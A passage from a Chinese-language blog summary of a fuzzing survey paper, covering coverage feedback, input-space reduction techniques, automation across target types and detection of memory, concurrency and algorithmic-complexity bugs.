<em>hash(b<sub>i</sub>, b<sub>j</sub>)</em> ，其中 <em>b<sub>i</sub></em> 与 <em>b<sub>j</sub></em> 为随机指派的基本块标识符（block identifier）</li></ul><p>尽管这种方法执行得很快，但其舍弃了对边覆盖率的预测，同时这种维护边覆盖率的实现导致了<strong>边碰撞</strong>（edge collision）问题（例如两条不同的边被分配了同一个标识符），为了分配唯一的边标识符，fuzzer 需要小心地分配块标识符且提供更精确的哈希函数</p><blockquote><p>如 Fig3.a 所示，若 <em>id<sub>AB</sub></em> &#x3D;&#x3D; <em>id<sub>AC</sub></em> 且  <em>id<sub>BD</sub></em> &#x3D;&#x3D; <em>id<sub>CD</sub></em> ，则路径 <code>ABD</code> 与 <code>ACD</code> 被当作同一条路径，在这种设想下 fuzzer 无法获得新的覆盖率，其会<strong>忽略</strong>漏洞路径 <code>ACDEG</code></p></blockquote><p>Fuzzer 通过位图便能确定一个输入是否产生了新的边；特别地，fuzzer 维护一个总体位图（overall bitmap，独立执行位图（bitmap of individual execution）的集合），在确定新的边时，fuzzer 将独立位图与总体位图对比，以检查这条新的边是否存在于独立位图中，然而位图集合丧失了执行信息</p><blockquote><p>例如若 Fig3.a 中的路径 <code>ABDEG</code> 与 <code>ACDFG</code> 已经被训练，则新的边 <code>ACDEG</code> 将不会被作为新的种子保留，因为在总体位图中早已存在所有的边</p></blockquote><p>一个解决方案是研究独立位图的融合，但由于融合位图会带来太多的种子，这需要在 fuzzing 效率与敏感覆盖率间平衡，一个潜在的解决方案是使用<strong>动态主成分分析</strong>（dynamic principle component analysis）来减少数据集的维度，其他的解决方案则是为边覆盖率提供额外信息，包括：边哈希（edge hash）、调用上下文（calling context）、多级覆盖率（multilevel coverage）、代码复杂度（code complexity）</p><p>对位图的改进关注于搜寻更多的代码覆盖，然而这样的改进可能没法探索复杂的执行状态，因此一个有效的解决方案便是通过<strong>人为监督</strong>（human-in-the-loop）来指导对复杂执行状态的探索</p><blockquote><p>例如 Fig3.b 为一段迷宫代码，<code>(a,b)</code> 代表在迷宫中的位置，为了触发 <code>bug()</code>，<code>(a,b)</code> 应当有着特定的值，然而 <code>switch</code> 仅有四条边，可以被快速遍历，在这之后 fuzzing 便失去了对到达漏洞位置的指引；此时分析者可以让模糊测试过程探索 <code>(a,b)</code> 的不同值</p></blockquote><p>此外，比较条件的值比二进制结果更加敏感，即 <code>examined</code> 或 <code>not examined</code></p><blockquote><p>例如 Fig3.a 中若 <code>(x[3] - 0x44)</code> 的值是可知的，则 fuzzer 便能选择更能满足条件 <code>if (x[3] == 0x44)</code> 的种子</p></blockquote><h3 id="3-5-2-Diverse-Fitness"><a href="#3-5-2-Diverse-Fitness" class="headerlink" title="3.5.2 Diverse Fitness"></a>3.5.2 Diverse Fitness</h3><p>由于模糊测试可用来检测多种应有的缺陷，而代码覆盖对于模糊测试而言并非一直都是最好的反馈，因此多种类型的 fitness 被针对特定的应用程序或缺陷设计了出来：</p><ul><li><p><em>Legality of execution result</em> ：一门 OOP 语言（比如 Java）由一个方法调用序列组成，非法的执行结果会抛出异常；在模糊测试过程中会生成并维护能探索更多新的及合法的目标状态的新的调用序列</p></li><li><p><em>State Machine of protocol implementations</em> ：由于协议的复杂性，fuzzer 通常通过搭积木的方式来推断出状态机：以一组种子起始变异以获取新的状态，基于状态机分析漏洞点并搜寻可能存在漏洞的状态转移</p></li><li><p><em>Safety policy of robotic vehicles</em> ：机器装置的物理&#x2F;功能安全需要  <em>安全策略</em> （safety policy，例如机器的温度限制），因此可以保留接近违反安全策略的输入作为种子进行变异</p></li><li><p><em>Fitness for deep learning system</em> ：对深度学习系统（Deep Learning Systems，DLSs）的模糊测试设计了几种不同的 fitness</p></li></ul><blockquote><p>例如神经元覆盖率以发现极端场景（corner cases），损失函数以增强训练数据，操作符层（operator-level）覆盖率以探索深度学习推理机（inference engines）</p></blockquote><ul><li><p><em>Validation log for Android SmartTVs</em> ： validation log 可以被用来推断合法的输入以及获取输入边界，这为 fuzzer 提供了高效的种子且缩小了输入空间</p></li><li><p><em>Behavioral asymmetry of testing</em> ：在差异测试下（differential testing），可以通过在相同功能实现的相同输入上观测到不同行为来发现漏洞</p></li><li><p><em>Alias coverage for data race</em> ： alias coverage 通过跟踪一对可能交互的内存访问，以此发现由于缺乏合适的同步机制导致的条件竞争漏洞</p></li></ul><blockquote><p>文中提到的是内核文件系统中的条件竞争，由于两个线程访问一块共享内存时缺乏合适的同步机制导致，但笔者觉得条件竞争应该不局限于这样的情况（</p></blockquote><ul><li><em>Dangerous locations for bugs</em> ：危险区域是容易触发漏洞的区域，fuzzer 可以直接将资源集中在上边进行模糊测试以提高效率</li></ul><blockquote><p>例如对并发漏洞而言可以是会造成对原子性的违反、条件竞争等的代码区域，对于非并发漏洞而言可以通过补丁测试、崩溃复现、静态分析报告、信息流检测来获得，此外危险区域也可以是内存访问、sanitizer 检查或是 commit 记录</p></blockquote><h2 id="3-6-Evaluation-Theory"><a href="#3-6-Evaluation-Theory" class="headerlink" title="3.6 Evaluation Theory"></a>3.6 Evaluation Theory</h2><p>一个合适的<strong>评估</strong>（evaluation）可以在模糊测试过程中帮助其提高表现，包括有效实验语料库、公平的评估环境、合理的模糊测试时间、全面的对比指标</p><blockquote><p><strong>Gap 1</strong>：模糊测试理论缩小了输入空间与缺陷空间的差距，基于程序表现（如漏洞到达、状态转移、状态发现）规划模糊测试过程，大部分的理论规划了种子调度，几乎所有的 fuzzer 基于遗传算法规划种子存留</p></blockquote><h1 id="0x04-SEARCH-SPACE-OF-INPUTS"><a href="#0x04-SEARCH-SPACE-OF-INPUTS" class="headerlink" title="0x04. SEARCH SPACE OF INPUTS"></a>0x04. SEARCH SPACE OF INPUTS</h1><p>为了缩小输入空间、提升模糊测试的性能，fuzzers 将一个输入中的<strong>关联字节</strong>（related bytes，例如组成同一数据结构、影响同一路径约束、符合同一文法）分组并为每一组使用特定的变异器（包括字节变异与块变异）</p><blockquote><p> 假设输入空间中有 <code>a* b</code> 字节，将其等分为 a 块，则相较于 <em>256<sup>a*b</sup></em> 而言，对于特定路径约束的搜索空间仅为 <em>a * 256<sup>b</sup></em> </p></blockquote><p>在路径约束求解中，对关联字节的关注同样能缩小搜索空间，例如 Fig4.a 在第 13 行的约束满足的情况下第14行仅与一个字节相关联</p><p>一种特殊的输入是为如协议、编译器等进行高度结构化的输入，如 Fig4.b 中代码需要一个特殊起始格式的输入</p><p><img src="https://s2.loli.net/2022/10/27/PNphaetFqYm8jVJ.png" alt="Fig. 4. Search space of input. "></p><p>Table 2 中的 fuzzers 的主要贡献是缩小输入空间：</p><p><img src="https://s2.loli.net/2022/10/27/JweSDsxm8UZCTLk.png" alt="Table 2. Input space. Fuzzers reduce the input space by grouping the related bytes. The groups of bytes are obtained based on certain relation."></p><h2 id="4-1-Byte-constraint-Relation"><a href="#4-1-Byte-constraint-Relation" class="headerlink" title="4.1 Byte-constraint Relation"></a>4.1 Byte-constraint Relation</h2><p>大部分的路径约束仅被一小部分输入所影响，因此若 fuzzer 仅变异关联字节，则能通过缩小输入的搜索空间从而显著地提升性能</p><blockquote><p>例如我们需要变异一个字节数组 a[10] 需要生成 <em>256<sup>11</sup></em> 个输入，但若是我们知道仅有 a[2] 的值是有用的，则我们仅需要生成 256 个输入</p></blockquote><p>在获得字节约束关系后，可以随机地或从0~255 进行变异，但都比较低效；若在字节关系的推断过程中可以获得比较指令的值，fuzzer 可以在变异时选择通过路径约束的值</p><p>此外，模糊测试可以使用 <em>坡度下降算法</em> （gradient descent algorithm）来变异关联字节并逐渐解决路径约束</p><h3 id="4-1-1-Dynamic-Taint-Analysis"><a href="#4-1-1-Dynamic-Taint-Analysis" class="headerlink" title="4.1.1 Dynamic Taint Analysis"></a>4.1.1 Dynamic Taint Analysis</h3><p><strong>动态污点分析</strong>（Dynamic Taint Analysis，DTA）是在构建输入与路径约束的关系中常用的一项技术，其通过<strong>在输入中进行标记后在运行中传播标签（label）并检查获取到标签的变量</strong>的方式来构建变量与数据的关联</p><p>fuzzer 可以使用 DTA 来构建输入与安全敏感点（security-sensitive points，例如条件跳转或系统调用）间的关系</p><h3 id="4-1-2-Relation-Inference"><a href="#4-1-2-Relation-Inference" class="headerlink" title="4.1.2 Relation Inference"></a>4.1.2 Relation Inference</h3><p>DTA 需要大量的人工且可能获得不准确的关系（due to implicit data flow）。由于 fuzzing 过程中需要大量执行测试用例，一种轻量的解决方案是在运行时推断字节关联，有两种具体方案：</p><ul><li>观测是否对一个字节的变异改变了变量的值，这意味着该字节可能与变量、比较指令或分支相关联</li><li>基于深度学习构建输入字节与分支行为间大概的关系</li></ul><h2 id="4-2-Concolic-Execution"><a href="#4-2-Concolic-Execution" class="headerlink" title="4.2 Concolic Execution"></a>4.2 Concolic Execution</h2><p><strong>混合执行</strong>（Concolic Execution，aka dynamic symbolic execution）将程序变量视作<strong>符号变量</strong>（symbolic variables），跟踪路径约束并使用约束求解器来为特定路径生成具体输入：通过求解路径约束来缩小输入空间</p><blockquote><p>关于什么是 concolic execution，可以看这张图（<del>如果你不知道符号执行那👴建议先别看了</del>）：</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>同时使用符号执行与模糊测试的技术称之为<strong>混合模糊测试</strong>（hybrid fuzzing）或<strong>白盒模糊测试</strong>（whitebox fuzzing）：使用模糊测试来执行目标程序中的执行路径＋使用符号执行来求解执行路径中的约束</p><p>由于为每条执行路径都使用符号执行会非常耗时，因此当 fuzzing 无法获得更多状态时，混合执行被用以解决 fuzzing 无法满足的路径约束</p><p>混合模糊测试的一个改进便是为混合执行排序出最难的路径供其解决，也可以通过开发一个大概的约束求解器来提升，通常<strong>可满足性模理论</strong>（satisfiability modulo theory，STM）求解器（例如 z3 或 MathSAT5）被用来求解路径约束，但存在复杂约束及路径爆炸的问题，为了缓解这个问题，约束求解器仅符号化被输入影响的路径</p><p>另一个改进便是让约束求解器使用灰盒模式，例如，其使用线性函数以接近约束行为，因为大部分的路径约束被发现都是趋向于是线性的或单调的</p><p>研究人员也开始使用模糊测试来求解路径约束，例如 <a href="https://dl.acm.org/doi/10.1145/3338906.3338921">JFS</a> 将 SMT 公式翻译为程序并使用覆盖率指导的模糊测试来探索程序，模糊测试生成的输入到达特定区域或相应的程序时意味着解出了 SMT 公式</p><p>约束求解器也可以基于目标的特性进行改进，<a href="https://ieeexplore.ieee.org/document/9152662">Pangolin</a> 使用多面路径抽象（polyhedral path abstraction）来解决嵌套路径约束（nested path constraints），这种方法会保留历史约束的解答空间（solution space）并重用解答空间以满足当前路径约束的可达性</p><blockquote><p>例如对于 Fig4.a 中的第14行的约束，输入首先要满足第13行的约束</p></blockquote><p>为了在需要高度结构化的输入的程序中使用混合模糊测试，<a href="https://dl.acm.org/doi/10.1145/1375581.1375607">Godefroid</a> 将文法中的词素（token）符号化为符号变量，并使用上下文无关的约束求解器（context-free constraint solver）来生成新的输入</p><h2 id="4-3-Program-Transformation"><a href="#4-3-Program-Transformation" class="headerlink" title="4.3 Program Transformation"></a>4.3 Program Transformation</h2><p>对模糊测试而言，<strong>程序转换</strong>（program transformation）的目的是移除防止模糊测试发现更多执行状态的完整性检查，通过移除这些检查，模糊测试可以探索到目标程序更深处的代码并暴露出潜在的漏洞，但这也会引入一些误报（false positives），可以通过符号执行进行验证</p><p>因此 program transformation 通过聚焦于可能触发漏洞的输入来缩小搜索空间</p><h2 id="4-4-Input-Model"><a href="#4-4-Input-Model" class="headerlink" title="4.4 Input Model"></a>4.4 Input Model</h2><p>许多应用程序都需要高度结构化的输入，例如协议实现、系统调用等，<strong>输入模型</strong>（input model）指定了构造高度结构化输入的规则，包括结构体、格式、输入的数据约束，即违反语法或语义的输入会在一开始就被拒绝，由此<strong>输入空间便被限制于输入模型</strong></p><h3 id="4-4-1-Accessible-Models-or-Tools"><a href="#4-4-1-Accessible-Models-or-Tools" class="headerlink" title="4.4.1 Accessible Models or Tools"></a>4.4.1 Accessible Models or Tools</h3><p>基于空白规范（bare specifications）的输入生成需要繁重的工程工作，复杂规范的解析也非常容易出错，因此研究社区为一些高度结构化的输入开源了一些工具</p><blockquote><p>例如 <a href="https://dl.acm.org/doi/10.1145/357766.351266">QuickCheck</a> 和 <a href="https://www.antlr.org/">ANTLR</a>，例如 <a href="https://www.ndss-symposium.org/ndss-paper/nautilus-fishing-for-deep-bugs-with-grammars/">NAUTILUS</a> 与 <a href="https://www.researchgate.net/publication/335427315_Superion_Grammar-Aware_Greybox_Fuzzing">Superion</a> 便基于 ANTLR 生成输入</p></blockquote><p>在一些场景下输入模型也可以是输入的类型（例如 API 参数或物理信号）</p><h3 id="4-4-2-Integration-of-Implementations"><a href="#4-4-2-Integration-of-Implementations" class="headerlink" title="4.4.2 Integration of Implementations"></a>4.4.2 Integration of Implementations</h3><p>另一个前景较好的方案是将模糊测试与目标应用进行集成，这样的集成允许模糊测试通过客制化输入生成过程来测试预期性能</p><blockquote><p>例如 <a href="https://dl.acm.org/doi/10.1145/2976749.2978411">TLS-Attacker</a> 创造了能基于每个段的类型变异输入的框架，并能改变协议消息的顺序</p></blockquote><h3 id="4-4-3-Intermediate-Representation"><a href="#4-4-3-Intermediate-Representation" class="headerlink" title="4.4.3 Intermediate Representation"></a>4.4.3 Intermediate Representation</h3><p>另一个复杂的方案是将输入模型转化为一种<strong>中间表示</strong>（Intermediate Representation）：</p><ul><li>将原始输入文件翻译为更简单且更统一的 IR，fuzzer 基于 IR 进行变异后再翻译回原始输入格式</li></ul><p>这种变异策略能在保持了语法与语义的正确性的同时生成了多种输入</p><h2 id="4-5-Fragment-Recombination"><a href="#4-5-Fragment-Recombination" class="headerlink" title="4.5 Fragment Recombination"></a>4.5 Fragment Recombination</h2><p>另一种生成输入的方式是通过<strong>碎片重整合</strong>（fragment recombination）：将输入文件分成许多的小块（fragments），通过从不同文件中整合碎片来生成新的输入，同时每个碎片应符合规范以确保语法正确性</p><p><img src="https://s2.loli.net/2022/10/28/GqE5UckCFQie96L.png" alt="Fig. 5. Fragment Recombination."></p><p>如 Fig.5 所示，fuzzer 首先将输入文件解析成一棵保持语法正确性的树（例如 AST），这需要一个有效的输入语料库来解析输入，同时 fuzzer 还需要为语料库收集此前造成错误行为的有问题的输入</p><p>在此前曾经发现漏洞的区域或附近仍有可能存在新的漏洞，而有问题的输入已执行了能造成错误行为的复杂路径，因此碎片重整合可能会执行同样或相似的路径，这有利于探索更深的代码</p><p>在第二阶段输入被碎片化后会存放到碎片池中，由于输入被解析成 AST，fuzzer 可以使用非终止节点（non-terminals）来组成新的子树，在重整合碎片时基于 随机&#x2F;遗传算法&#x2F;机器学习 来选用语法兼容的（syntactically compatible）碎片，此外语义正确性也对模糊测试的效率有重要影响</p><blockquote><p>例如 <a href="https://www.ndss-symposium.org/ndss-paper/codealchemist-semantics-aware-code-generation-to-find-vulnerabilities-in-javascript-engines/">CodeAlchemist</a> 使用汇编约束标记碎片，仅在碎片满足约束时才进行整合</p></blockquote><h2 id="4-6-Format-Inference"><a href="#4-6-Format-Inference" class="headerlink" title="4.6 Format Inference"></a>4.6 Format Inference</h2><p>若输入模型不可用，推断输入格式也是前景较好的解决方案，且一个输入模型仅能生成一种特定格式的输入，因此<strong>格式推断</strong>（format inference）比基于模型的方案更加灵活</p><h3 id="4-6-1-Corpus-based"><a href="#4-6-1-Corpus-based" class="headerlink" title="4.6.1 Corpus-based"></a>4.6.1 Corpus-based</h3><p>一种直接的方案是从有效输入语料库进行推断。由于缺乏输入模型，研究者建立了端到端（end-to-end）的机器学习模型作为替代，<strong>循环神经网络</strong>（recurrent neural network，RNN）这一模型更合适生成结构化输入，但这一替代方案有可能受到生成非法输入的影响，因此训练数据需要相应的改进</p><blockquote><p>例如 <a href="https://faculty.ist.psu.edu/wu/papers/DeepFuzz.pdf">DeepFuzz</a> 生成语法有效输入的比例仅为 82.63%</p></blockquote><p>模糊测试也可以基于有效输入语料库合成一种上下文无关语法来生成高度结构化的输入</p><h3 id="4-6-2-Coverage-based"><a href="#4-6-2-Coverage-based" class="headerlink" title="4.6.2 Coverage-based"></a>4.6.2 Coverage-based</h3><p>基于语料库的解决方案需要对输入规则的综合覆盖，可能会不实际，此外其并没有使用内部执行状态的信息，这可能会造成较低的代码覆盖率</p><p>输入的格式指示了输入中不同字节的关系，因此基于代码覆盖，fuzzer 可以推断字节到字节的（byte-to-byte）关系来启动模糊测试</p><blockquote><p>例如 <a href="https://www.usenix.org/conference/usenixsecurity19/presentation/blazytko">GRIMOIRE</a> 使用代码覆盖来推断目标程序所需的输入格式</p></blockquote><h3 id="4-6-3-Encoding-Function"><a href="#4-6-3-Encoding-Function" class="headerlink" title="4.6.3 Encoding Function"></a>4.6.3 Encoding Function</h3><p>与上述关注于输入的方法不同，有的 fuzzer 搜索会编码输入格式的代码区域，因为这类代码与生成结构良好的（well-structured）输入相关，故 fuzzer 在编码格式前进行变异</p><p>尽管 PUTs 的源码可能没法获取，但他们所生成的结构良好的输入则不然，例如有的社区会开源一些生成高度结构化输入的工具</p><p>对 IOT 设备而言，大部分都通过配套程序来控制，因此通过定位与编码格式相关的代码，变异可以在函数的参数或是计算格式的指令上完成</p><blockquote><p>例如 <a href="https://www.ndss-symposium.org/wp-content/uploads/2018/03/NDSS2018_01A-1_Chen_Slides.pdf">IOTFuzzer</a> 便 hook 了这类函数并对其参数进行变异</p></blockquote><h2 id="4-7-Dependency-Inference"><a href="#4-7-Dependency-Inference" class="headerlink" title="4.7 Dependency Inference"></a>4.7 Dependency Inference</h2><p>格式推断主要解决语法需求，这仍可能生成有着错误数据依赖项的输入，例如在 Fig.6 中的 <code>snippet2</code> 中，在 <code>2-5</code> 出现了一个由于 <code>errf()</code> 未定义导致的错误</p><p><img src="https://s2.loli.net/2022/10/28/pZnh2GsWyLJ4d1g.png" alt="Fig. 6 Semantic error (JavaScript). "></p><p>许多应用都需要在输入中有着正确的<strong>数据依赖项</strong>（data dependency），通常由一系列语句（statement）组成，包括系统调用、对象、APIs、ABIs等</p><h3 id="4-7-1-Documents-or-Source-Code"><a href="#4-7-1-Documents-or-Source-Code" class="headerlink" title="4.7.1 Documents or Source Code"></a>4.7.1 Documents or Source Code</h3><p>序列的数据依赖项通常通过静态分析来推断，因为许多应用都有相应的文档或源码，可以据此推断数据依赖项，并在模糊测试过程中在生成输入前先生成其先决项（prerequisites）</p><p>但静态分析误报率高且会错过接口的依赖项，因此一个较好的解决方案是结合静态分析与动态分析</p><h3 id="4-7-2-Real-world-Programs"><a href="#4-7-2-Real-world-Programs" class="headerlink" title="4.7.2 Real-world Programs"></a>4.7.2 Real-world Programs</h3><p>真实世界的许多程序通过命令行来调用接口，这便包含了数据依赖项，fuzzing 可以基于这些真实世界中程序的切片程序（program slicing）生成调用接口的新程序</p><p>数据依赖项也可以通过分析执行日志（execution log）来推断，日志中明确包含接口的顺序信息（例如哪个接口先被执行），同时隐含了接口间的参数依赖项信息</p><p>为了获得这些直接与间接的信息，模糊测试在执行过程中 hook 每个接口并记录自己所需的数据</p><blockquote><p><strong>Gap 2</strong>：输入空间的减小依赖于对语法&#x2F;语义关联的输入字节的分组，分组的优点是在探索更多执行状态中提升效率，由此 fuzzing 更倾向于满足路径约束以探索被这些约束守护的更深的代码区域</p></blockquote><h1 id="0x05-AUTOMATION"><a href="#0x05-AUTOMATION" class="headerlink" title="0x05. AUTOMATION"></a>0x05. AUTOMATION</h1><p><strong>自动执行</strong>（Automatic execution）是模糊测试理论与输入空间减方法的基础，而成功的模糊测试需要：</p><ul><li><strong>自动重复地运行 PUTs</strong>。大部分 fuzzer 都能测试命令行程序，但对于硬件或多语言软件而言不行</li><li><strong>对潜在漏洞的自动指示器</strong>（automatic indicator）。当前 fuzzer 使用 crashes 作为潜在漏洞的标志，但如条件竞争一类的漏洞并不会触发 crash</li><li><strong>高速执行</strong>。在相同的时间内检验更多的测试用例，以此增加发现漏洞的机会</li></ul><h2 id="5-1-Automatic-Execution-of-PUTs"><a href="#5-1-Automatic-Execution-of-PUTs" class="headerlink" title="5.1 Automatic Execution of PUTs"></a>5.1 Automatic Execution of PUTs</h2><p>对不同应用程序的自动化模糊测试需要不同的工程努力，本节介绍几种自动化模糊测试的方法</p><h3 id="5-1-1-Command-line-Programs"><a href="#5-1-1-Command-line-Programs" class="headerlink" title="5.1.1 Command-line Programs"></a>5.1.1 Command-line Programs</h3><p>模糊测试在测试命令行程序时通过子进程运行 PUTs 并将所需选项（options）与输入喂给程序，同时在执行 PUT 时其并不会重复所有的步骤，而是克隆出子进程以略过预处理步骤</p><p><em>在整个模糊测试过程中通常仅用一个命令行选项（即所有输入都基于该选项执行），因为不同的选项代表了不同的代码覆盖，而一次全面的测试需要列举所有的选项，因此一个高效的方案便是若对于一个选项而言当前输入无效，则跳过剩余的所有选项</em></p><blockquote><p>这里论文原文说“该种方案的一个重要的观测是若一个输入对一个选项而言是无效的，则其也会对其他选项无效”，但笔者觉得这个说法有失偏颇（</p></blockquote><h3 id="5-1-2-Deep-Learning-Systems"><a href="#5-1-2-Deep-Learning-Systems" class="headerlink" title="5.1.2 Deep Learning Systems"></a>5.1.2 Deep Learning Systems</h3><p>测试深度学习系统（DLS）的过程类似于测试命令行，通过生成输入（可以是训练数据、测试数据或不同目标上的深度学习模型）测试 DLSs 以获得更好的 fitness（可以是神经元覆盖率、损失函数、运算符级覆盖率），同时除了检测缺陷以外也会检查模型的健壮性</p><h3 id="5-1-3-Operating-System-Kernels"><a href="#5-1-3-Operating-System-Kernels" class="headerlink" title="5.1.3 Operating System Kernels"></a>5.1.3 Operating System Kernels</h3><p>OS kernel 包含了许多中断与内核线程，其执行状态无法确定，由此我们使用 hypervisor（如 QEMU）来运行内核，并通过 <a href="https://zhangtong16.github.io/2019/06/05/Intel-Processor-Trace/">Intel’s Processor Trace</a> （PT）技术来获取代码覆盖；尽管这种方法能带反馈地测试不同种内核，但仍需要人工构造语法&amp;语义正确的输入</p><p>因为输入包括文件系统镜像或一系列系统调用，fuzzers 可以以更轻量级的方法进行测试：在系统调用的数据依赖项被分析&#x2F;推断出来后生成一系列系统调用并在目标内核上运行，并监测代表潜在漏洞的 system panics</p><p>另一种测试方法是通过模拟外设并生成相应输入来测试内核驱动</p><h3 id="5-1-4-Cyber-Physical-Systems"><a href="#5-1-4-Cyber-Physical-Systems" class="headerlink" title="5.1.4 Cyber-Physical Systems"></a>5.1.4 Cyber-Physical Systems</h3><p><strong>信息物理系统</strong>（Cyber-Physical Systems，CPS）包含两个紧密结合的主要成分，即<strong>计算元素</strong>（computational elements）与<strong>物理过程</strong>（physical processes）</p><p>一个被广泛使用的计算元素是 <em>可编程逻辑控制器</em> （programmable logic controller，PLC），其控制着物理过程的驱动器并从传感器中获取输入，因此在 fuzzing CPSs 时 fuzzer 可以替换掉 PLCs 并通过网络直接向驱动器发送大量的命令</p><p>PLC 的二进制文件也是 CPSs 的一个可测试点，但其有着多种二进制格式以及复杂的与物理实体间的通信；基于对 PLC 二进制文件与开发平台的分析，自动化的 fuzz 可以在其运行在 PLC 设备上时进行</p><h3 id="5-1-5-Internet-of-Things"><a href="#5-1-5-Internet-of-Things" class="headerlink" title="5.1.5 Internet of Things"></a>5.1.5 Internet of Things</h3><p>IOT 的自动化 fuzzing 包括模拟与网络级测试：</p><ul><li>模拟器可以在没有对应硬件时运行 IOT 固件，以灰盒模式测试目标程序</li><li>网络级的 fuzzing 以黑盒模式进行测试，即通过网络向 IOT 设备发送信息，以响应作为执行结果，fitness 便是类型数量</li></ul><h3 id="5-1-6-Applications-with-Graphical-User-Interface"><a href="#5-1-6-Applications-with-Graphical-User-Interface" class="headerlink" title="5.1.6 Applications with Graphical User Interface"></a>5.1.6 Applications with Graphical User Interface</h3><p>GUI 程序的执行比命令行慢得多，而执行速度是 fuzzing 的关键，因此对 GUI 程序的自动化测试通常将 GUI 替换为一种更快的方案并以命令行模式执行目标</p><blockquote><p>例如对 UI 操作建模后为安卓应用生成事件序列（event sequences）</p></blockquote><p>此外，fuzzer 也可以使用 <strong>hardness</strong> 来准备执行上下文，以直接唤醒 GUIs 中的目标函数</p><h3 id="5-1-7-Applications-with-Network"><a href="#5-1-7-Applications-with-Network" class="headerlink" title="5.1.7 Applications with Network"></a>5.1.7 Applications with Network</h3><p>智能合约、协议实现、云服务、Android Native System Services、机器人装置等通过网络接收输入，由此可以在本地生成输入后由目标应用远程执行，自动测试的效率依赖于生成输入的质量与反映执行状态的 fitness</p><h2 id="5-2-Automatic-Detection-of-Bugs"><a href="#5-2-Automatic-Detection-of-Bugs" class="headerlink" title="5.2 Automatic Detection of Bugs"></a>5.2 Automatic Detection of Bugs</h2><p>对于漏洞检测器（detector）而言漏洞的代码区域不可知，甚至不知道程序中是否存在漏洞，因此在自动 fuzzing 中记录潜在漏洞就变得十分重要，漏洞的标志（indicator）通常是程序执行时崩溃，也有一些基于漏洞模式（pattern）设计的专一而高效的指示器</p><p>本节主要介绍成功由 fuzzing 发现的六种漏洞：内存损坏、并发漏洞、算法复杂性、spectre 型漏洞、测信道、整型漏洞</p><h3 id="5-2-1-Memory-violation-Bugs"><a href="#5-2-1-Memory-violation-Bugs" class="headerlink" title="5.2.1 Memory-violation Bugs"></a>5.2.1 Memory-violation Bugs</h3><blockquote><p>这段对于打 Pwn 的同学来说都比较无聊，笔者就不细录了</p></blockquote><p><strong>内存损坏型漏洞</strong>（Memory-violation Bugs）是最古老也最严重的安全漏洞，分为两类：</p><ul><li><strong>空间安全损坏</strong>（spatial safety violation）：即非法内存访问。如 Fig.7a 便是一个越界（out-of-bound）内存访问  </li><li><strong>时间安全损坏</strong>（temporal safety violation）：即非法内存引用。如 Fig.7b 便是一个 use-after-free 漏洞</li></ul><p><img src="https://s2.loli.net/2022/10/30/nAuTKjBHO2JpeXE.png" alt="Fig. 7. Memory violation bugs"></p><p>尽管已经有一些针对内存破坏型漏洞的缓解措施（migration），但由于开销、兼容性、健壮性等原因，大部分缓解措施并未实际被使用</p><blockquote><p>例如 CTF 里打 kernel pwn 通常都要 bypass KPTI，但在真实世界的高性能场景下这一特性通常是被关闭的</p><blockquote><p>（听说在实际应用中有20%以上的性能损耗，<del>👴也不知道是不是真的</del></p></blockquote></blockquote><blockquote><p>论文给出了两个例子：</p><ul><li><a href="https://www.usenix.org/conference/usenixsecurity13/technical-sessions/papers/haller">Dowser</a> ：认为缓冲区溢出主要发生于循环中对数组的访问，通过排序循环中内存访问指令并给更高排序的输入高优先级后利用污点分析与混合执行求解选中输入的路径约束以检测 OOB 漏洞</li><li><a href="https://dl.acm.org/doi/10.1145/3377811.3380386">UAFL</a>：由于 UAF 漏洞通常是分配→释放→重用三步走，这一漏洞模式驱动 UAFL 生成能够逐渐覆盖一整列潜在 UAF 漏洞的输入，潜在 UAF 序列通过基于漏洞模式的静态类型分析完成</li></ul></blockquote><h3 id="5-2-2-Concurrency-Bugs"><a href="#5-2-2-Concurrency-Bugs" class="headerlink" title="5.2.2 Concurrency Bugs"></a>5.2.2 Concurrency Bugs</h3><p><strong>并发型漏洞</strong>（Concurrency Bugs）在程序没有合适的同步机制或运行顺序时发生，通常可以分为：</p><ul><li><strong>死锁型漏洞</strong>（deadlock bugs）：等待资源释放（如锁）</li><li><strong>非死锁型漏洞</strong>（non-deadlock bugs）<ul><li>原子性损坏型（atomicity-violation）：破坏了某一代码区域的 <em>期望序列性</em> （desired serializability），如 Fig.8a 所示的 <code>Thread 1</code> 第三行释放了 <code>p-&gt;info</code>，<code>Thread 2</code> 的第二行将 <code>p-&gt;info</code> 置为 NULL，从而引发错误</li><li>顺序型（order）漏洞：以错误的顺序对内存区域进行访问，如 Fig.8b 中 <code>Thread 2</code> 在 <code>mThd</code> 被初始化前对 <code>mState</code> 赋值，这会造成未初始化变量引用漏洞</li></ul></li></ul><blockquote><p><del>真的有人会这么写代码🐎</del></p></blockquote><p><img src="https://s2.loli.net/2022/10/30/AfHSLXUPDItFRqB.png" alt="image.png"></p><p>发现死锁漏洞的一个方法是在 <em>锁顺序图</em> （lock order graph）上检测代表死锁的环（cycles）</p><blockquote><p>论文举了这些例子：</p><ul><li><a href="https://ieeexplore.ieee.org/document/6227156/">MagicFuzzer</a>： 为了提高效率，其会移除不在任何环中的锁，并检查剩余的环</li><li><a href="https://dl.acm.org/doi/abs/10.1145/1453101.1453121">ATOMFUZZER</a>：对于原子性破坏，其会观测原子块内的锁被两个线程重复请求与释放的漏洞模式</li><li><a href="https://dl.acm.org/doi/10.1145/1321631.1321679">CalFuzzer</a>：过多的线程交错（interleaving）带来状态爆炸（state-explosion），其基于交错的等价性缓解状态爆炸</li></ul></blockquote><h3 id="5-2-3-Algorithmic-Complexity"><a href="#5-2-3-Algorithmic-Complexity" class="headerlink" title="5.2.3 Algorithmic Complexity"></a>5.2.3 Algorithmic Complexity</h3><p><strong>算法复杂性</strong>（Algorithm Complexity，AC）漏洞是算法在最坏情况下会显著的降低性能，从而可能导致拒绝服务（Denial-of-Service）攻击，Fig.9 展示了一个有着不同算法复杂度的例子，在最坏情况下可以被攻击者用作 DoS  攻击：</p><p><img src="https://s2.loli.net/2022/10/30/mYhDVBvyeSzcrix.png" alt="Fig. 9. Algorithm complexity"></p><blockquote><p>论文举了以下例子：</p><ul><li><a href="https://dl.acm.org/doi/10.1145/3133956.3134073">SlowFuzz</a>：通过生成增加执行指令数量的输入来发现 AC 漏洞</li><li><a href="https://www.ndss-symposium.org/ndss-paper/hotfuzz-discovering-algorithmic-denial-of-service-vulnerabilities-through-guided-micro-fuzzing/">HotFuzz</a>：通过最大化单个方法的消耗来检测 Java 中的 AC 漏洞</li><li><a 